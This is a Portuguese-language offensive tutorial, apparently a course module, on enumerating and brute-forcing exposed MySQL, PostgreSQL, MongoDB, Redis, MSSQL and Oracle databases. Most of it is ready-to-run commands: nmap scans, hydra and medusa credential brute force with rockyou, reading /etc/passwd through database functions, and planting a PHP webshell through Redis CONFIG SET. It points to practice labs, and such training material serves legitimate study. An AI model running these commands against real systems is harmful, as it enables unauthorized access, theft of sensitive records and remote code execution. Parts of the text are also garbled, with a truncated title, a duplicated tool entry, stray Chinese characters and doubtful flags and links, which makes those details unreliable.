# Enumeração e Brute Force de Bancos de Descobrir e atacar bancos de dados expostos.

---

## 📚 O que é Database Security?

**Database Security** é proteger bancos de dados contra acesso não autorizado. Bancos guardam os dados mais sensiveis — senhas, CPFs, cartões, emails.

### Por que isso é importante?

- **Banco de dados = o prêmio** para o atacante
- Um SQL Injection pode expor **milhões de registros**
- Credenciais de banco são frequentemente **padrão ou fracas**
- Vazamento de dados é **crime** (LGPD, GDPR)

### Como funciona na prática?

```
Encontrar banco aberto (enumeração)
        ↓
Testar senhas fracas (brute force)
        ↓
Acessar banco (credenciais ou injeção)
        ↓
Explorar dados (tables, columns, rows)
        ↓
Escalation (para outros bancos/servidores)
```

### Bancos de dados mais atacados

| Banco | Porta padrão | Como atacar |
|:---|:---|:---|
| **MySQL** | 3306 | Brute force, SQL Injection |
| **PostgreSQL** | 5432 | Brute force, execução de comandos |
| **MongoDB** | 27017 | Sem autenticação padrão |
| **Redis** | 6379 | Sem autenticação padrão |
| **MSSQL** | 1433 | Pass-the-hash |

### Ferramentas

| Ferramenta | Para que serve |
|:---|:---|
| **sqlmap** | SQL Injection automático |
| **Medusa** | Brute force em bancos |
| **NoSQLMap** | Injeção em MongoDB |
| **Medusa** | Brute force em bancos |

## Instalação das Ferramentas

```bash
# nmap (enumeração)
sudo apt install -y nmap

# hydra (brute force)
sudo apt install -y hydra

# medusa (brute force paralelo)
sudo apt install -y medusa

# mysql client
sudo apt install -y mysql-client

# postgresql client
sudo apt install -y postgresql-client

# redis-tools
sudo apt install -y redis-tools

# mongosh
sudo apt install -y mongosh
```

---

## Enumeração com Nmap

### Scan de Bancos de Dados
```bash
# Scan completo de serviços de banco
nmap -sV -p 3306,5432,27017,6379,1433,1521 target.com

# Scan específico para MySQL
nmap -sV -p 3306 --script mysql-info target.com

# Scan específico para PostgreSQL
nmap -sV -p 5432 --script pgsql-brute target.com

# Scan específico para MongoDB
nmap -sV -p 27017 --script mongodb-info target.com

# Scan específico para Redis
nmap -sV -p 6379 --script redis-info target.com
```

### Scripts Nmap Úteis
```bash
# Listar todos os scripts de banco de dados
ls /usr/share/nmap/scripts/ | grep -E "mysql|postgres|mongo|redis|oracle|mssql"

# Brute force com nmap
nmap -p 3306 --script mysql-brute target.com
nmap -p 5432 --script pgsql-brute target.com
```

---

## MySQL

### Enumeração
```bash
# Conectar ao MySQL
mysql -h target.com -u root -p

# Listar bancos de dados
mysql -h target.com -u root -p -e "SHOW DATABASES;"

# Listar tabelas
mysql -h target.com -u root -p -e "USE database_name; SHOW TABLES;"

# Ver estrutura de tabela
mysql -h target.com -u root -p -e "DESCRIBE users;"

# Ver versão
mysql -h target.com -u root -p -e "SELECT VERSION();"

# Listar usuários
mysql -h target.com -u root -p -e "SELECT user, host FROM mysql.user;"
```

### Brute Force
```bash
# Com hydra
hydra -l root -P /usr/share/wordlists/rockyou.txt target.com mysql

# Com medusa
medusa -h target.com -u root -P /usr/share/wordlists/rockyou.txt -M mysql

# Com nmap
nmap -p 3306 --script mysql-brute --script-args userdb=users.txt,passdb=rockyou.txt target.com
```

### Verificar Permissões
```bash
# Verificar se tem FILE privilege
mysql -h target.com -u root -p -e "SHOW GRANTS;"

# Verificar se pode ler arquivos
mysql -h target.com -u root -p -e "SELECT LOAD_FILE('/etc/passwd');"

# Verificar se pode escrever arquivos
mysql -h target.com -u root -p -e "SELECT 'test' INTO OUTFILE '/tmp/test.txt';"
```

---

## PostgreSQL

### Enumeração
```bash
# Conectar ao PostgreSQL
psql -h target.com -U postgres

# Listar bancos de dados
psql -h target.com -U postgres -c "\l"

# Listar tabelas
psql -h target.com -U postgres -c "\dt"

# Ver versão
psql -h target.com -U postgres -c "SELECT version();"

# Listar usuários
psql -h target.com -U postgres -c "\du"

# Ver permissões
psql -h target.com -U postgres -c "\dp"
```

### Brute Force
```bash
# Com hydra
hydra -l postgres -P /usr/share/wordlists/rockyou.txt target.com postgres

# Com medusa
medusa -h target.com -u postgres -P /usr/share/wordlists/rockyou.txt -M postgres

# Com nmap
nmap -p 5432 --script pgsql-brute target.com
```

### Verificar Permissões
```bash
# Verificar se pode ler arquivos
psql -h target.com -U postgres -c "SELECT pg_read_file('/etc/passwd');"

# Verificar se pode executar comandos
psql -h target.com -U postgres -c "SELECT pg_backend_pid();"
```

---

## MongoDB

### Enumeração
```bash
# Conectar ao MongoDB
mongosh target.com:27017

# Listar bancos de dados
mongosh --eval "show dbs"

# Listar coleções
mongosh --eval "use admin; show collections"

# Verificar versão
mongosh --eval "db.version()"

# Listar usuários
mongosh --eval "use admin; db.system.users.find()"

# Verificar roles
mongosh --eval "use admin; db.getRoles()"
```

### Brute Force
```bash
# Com hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com mongodb

# Com medusa
medusa -h target.com -u admin -P /usr/share/wordlists/rockyou.txt -M mongodb
```

### Verificar Permissões
```bash
# Verificar se pode ler arquivos
mongosh --eval "use admin; db.runCommand({listCommands: 1})"

# Verificar se tem acesso a arquivos
mongosh --eval "var x = cat('/etc/passwd'); print(x)"
```

---

## Redis

### Enumeração
```bash
# Conectar ao Redis
redis-cli -h target.com

# Verificar versão
redis-cli -h target.com INFO server

# Listar chaves
redis-cli -h target.com KEYS "*"

# Verificar permissões
redis-cli -h target.com CONFIG GET requirepass

# Verificar se está autenticado
redis-cli -h target.com PING
```

### Brute Force
```bash
# Com hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com redis

# Com medusa
medusa -h target.com -u admin -P /usr/share/wordlists/rockyou.txt -M redis
```

### Verificar Permissões
```bash
# Verificar se pode escrever arquivos
redis-cli -h target.com SET test "hello"
redis-cli -h target.com GET test

# Verificar se pode executar comandos
redis-cli -h target.com CONFIG SET dir /tmp
redis-cli -h target.com CONFIG SET dbfilename shell.php
redis-cli -h target.com SET payload "<?php system($_GET['cmd']); ?>"
redis-cli -h target.com SAVE
```

---

## SQL Server (MSSQL)

### Enumeração
```bash
# Conectar ao SQL Server
sqlcmd -S target.com -U sa -P password

# Listar bancos de dados
sqlcmd -S target.com -U sa -P password -Q "SELECT name FROM sys.databases"

# Listar tabelas
sqlcmd -S target.com -U sa -P password -Q "SELECT table_name FROM information_schema.tables"

# Verificar versão
sqlcmd -S target.com -U sa -P password -Q "SELECT @@VERSION"
```

### Brute Force
```bash
# Com hydra
hydra -l sa -P /usr/share/wordlists/rockyou.txt target.com mssql

# Com medusa
medusa -h target.com -u sa -P /usr/share/wordlists/rockyou.txt -M mssql
```

---

## Oracle

### Enumeração
```bash
# Conectar ao Oracle
sqlplus user/password@target.com:1521/service_name

# Listar tabelas
sqlplus user/password@target.com:1521/service_name -c "SELECT table_name FROM user_tables;"

# Verificar versão
sqlplus user/password@target.com:1521/service_name -c "SELECT banner FROM v$version;"
```

### Brute Force
```bash
# Com hydra
hydra -l system -P /usr/share/wordlists/rockyou.txt target.com oracle-sid

# Com medusa
medusa -h target.com -u system -P /usr/share/wordlists/rockyou.txt -M oracle
```

---

## Lab Prático

### Exercício 1: Database Enumeration
- **Plataforma:** TryHackMe
- **Link:** https://tryhackme.com/room/dvwa
- **O que vai praticar:** Enumerar MySQL, encontrar credenciais
- **Tempo estimado:** 30 min

### Exercício 2: Redis Exploitation
- **Plataforma:** HackTheBox
- **Link:** https://app.hackthebox.com/rooms/redis
- **O que vai praticar:** Enumerar e explorar Redis exposto
- **Tempo estimado:** 45 min

### Dica de Estudo
> Sempre verifique se o banco de dados está exposto na internet antes de tentar brute force. Use nmap para descobrir portas abertas.

---

**Próximo:** [02-injecao-e-exfiltracao.md](02-injecao-e-exfiltracao.md)

---

### Resumo da ordem — Por que essa sequência?

Database Security segue: **escanar → identificar → conectar → explorar**.

```
PASSO 1: Scan de portas → Encontrar bancos expostos
├── POR QUE: Bancos de dados não devem estar expostos na internet
├── O QUE FAZER: Usar nmap para escanear portas padrão de bancos
├── COMANDO: nmap -sV -p 3306,5432,27017,6379,1433,1521 target.com
├── QUANDO AVANÇAR: Quando tiver lista de portas abertas com serviços
└── SE DER ERRADO: Se não encontrar portas, tente scan completo (-p-)

        ↓

PASSO 2: Identificar tipo de banco → Saber qual cliente usar
├── POR QUE: Cada banco tem cliente e comandos diferentes
├── O QUE FAZER: Verificar versão e tipo do serviço
├── COMANDO: nmap -sV -p PORTA --script mysql-info target.com
├── QUANDO AVANÇAR: Quando souber o tipo (MySQL, PostgreSQL, Mongo, Redis)
└── DICAS: Anote a versão — pode ter CVEs conhecidas

        ↓

PASSO 3: Brute force → Testar credenciais padrão
├── POR QUE: Muitos bancos ficam com senhas padrão ou fracas
├── O QUE FAZER: Usar hydra ou medusa com wordlists
├── COMANDO: hydra -l root -P /usr/share/wordlists/rockyou.txt target.com mysql
├── QUANDO AVANÇAR: Quando encontrar credenciais válidas
└── SE DER ERRADO: Se bloquear, tente com medusa (paralelo) ou nmap scripts

        ↓

PASSO 4: Enumerar dados → Listar bancos, tabelas, colunas
├── POR QUE: Após acesso, precisa saber o que tem價值
├── O QUE FAZER: Usar comandos nativos do banco
├── COMANDO: mysql -h target -u root -p -e "SHOW DATABASES;"
├── QUANDO AVANÇAR: Quando tiver lista de tabelas e colunas
└── DICAS: Foque em tabelas com dados sensíveis (users, orders, payments)

        ↓

PASSO 5: Verificar permissões → Testar escalada
├── POR QUE: Usuário pode ter permissões além do necessário
├── O QUE FAZER: Testar leitura/escrita de arquivos, criação de usuários
├── COMANDO: mysql -h target -u root -p -e "SHOW GRANTS;"
├── QUANDO AVANÇAR: Quando souber o nível de acesso
└── SE DER ERRADO: Se tiver FILE privilege, tente ler /etc/passwd ou escrever webshell
```

---

**Próximo:** [02-injecao-e-exfiltracao.md](02-injecao-e-exfiltracao.md)
